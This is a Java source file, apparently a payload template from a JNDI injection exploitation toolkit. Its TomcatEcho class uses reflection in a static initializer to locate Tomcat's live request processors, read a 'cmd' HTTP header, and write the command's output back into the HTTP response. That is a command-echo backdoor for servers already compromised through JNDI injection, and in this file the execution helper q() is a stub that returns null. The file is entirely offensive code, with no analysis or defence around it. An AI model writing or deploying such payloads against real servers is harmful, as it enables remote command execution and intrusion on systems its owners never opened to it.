package com.qi4l.jndi.template.echo;

public class TomcatEcho {

    public static String CMD_HEADER = "cmd";

    static {
        try {
            boolean                 flag   = false;
            ThreadGroup             group  = Thread.currentThread().getThreadGroup();
            ClassLoader             loader = Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Field f      = group.getClass().getDeclaredField("threads");
            f.setAccessible(true);
            Thread[] threads = (Thread[]) f.get(group);
            for (int i = 0; i < threads.length; i++) {
                try {
                    Thread t = threads[i];
                    if (t == null) continue;
                    String str = t.getName();
                    if (str.contains("exec") || !str.contains("http")) continue;
                    f = t.getClass().getDeclaredField("target");
                    f.setAccessible(true);
                    Object obj = f.get(t);
                    if (!(obj instanceof Runnable)) continue;
                    f = obj.getClass().getDeclaredField("this$0");
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getSuperclass().getDeclaredField("global");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getDeclaredField("global");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    f = obj.getClass().getDeclaredField("processors");
                    f.setAccessible(true);
                    java.util.List processors = (java.util.List) (f.get(obj));
                    for (int j = 0; j < processors.size(); ++j) {
                        Object processor = processors.get(j);
                        f = processor.getClass().getDeclaredField("req");
                        f.setAccessible(true);
                        Object req  = f.get(processor);
                        Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req);
                        str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{CMD_HEADER});
                        if (str != null && !str.isEmpty()) {
                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
                            java.io.ByteArrayOutputStream baos = q(str);
                            try {
                                Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk", false, loader);
                                obj = cls.newInstance();
                                cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, baos.toByteArray(), new Integer(0), baos.toByteArray().length);
                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                            } catch (NoSuchMethodException var5) {
                                Class cls = Class.forName("java.nio.ByteBuffer", false, loader);
                                obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{baos.toByteArray()});
                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                            }
                            flag = true;
                        }
                        if (flag) break;
                    }
                    if (flag) break;
                } catch (Exception ignored) {
                }
            }

        } catch (Exception ignored) {
        }
    }

    public static java.io.ByteArrayOutputStream q(String cmd) {
        return null;
    }
}
